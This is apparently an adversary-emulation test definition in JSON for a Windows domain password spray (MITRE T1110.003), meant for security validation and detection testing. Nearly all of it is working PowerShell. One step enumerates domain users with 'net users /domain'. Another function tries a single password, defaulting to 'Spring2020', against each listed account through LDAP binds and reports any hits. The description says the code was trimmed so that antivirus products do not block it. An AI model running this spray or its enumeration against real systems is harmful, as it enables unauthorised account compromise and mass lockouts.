{
  "id": "b15bc9a5-a4f3-4879-9304-ea0011ace63a",
  "name": "Password Spray Invoke-DomainPasswordSpray Light",
  "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5",
      "type": "execute-command",
      "data": {
        "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
      "name": "Check dependency 1/1",
      "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "407131ba-10de-4257-a232-2e7e3e4d2864",
      "name": "Resolve dependency 1/1",
      "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "308920de-fac4-4ad9-8169-d14637e6ec1f",
      "name": "Re-check dependency 1/1",
      "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
      "p": "on-success",
      "o": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5"
    },
    {
      "s": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
      "p": "on-failure",
      "o": "407131ba-10de-4257-a232-2e7e3e4d2864"
    },
    {
      "s": "407131ba-10de-4257-a232-2e7e3e4d2864",
      "p": "on-success",
      "o": "308920de-fac4-4ad9-8169-d14637e6ec1f"
    },
    {
      "s": "308920de-fac4-4ad9-8169-d14637e6ec1f",
      "p": "on-failure",
      "o": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5"
    }
  ],
  "tags": [
    "T1110",
    "T1110.003"
  ],
  "input_arguments": [
    {
      "name": "user_limit",
      "type": "integer",
      "description": "The max number of users to put in the list when running the prereq_command",
      "value": "200"
    },
    {
      "name": "password",
      "type": "string",
      "description": "The password to try for each user in users.txt",
      "value": "Spring2020"
    }
  ]
}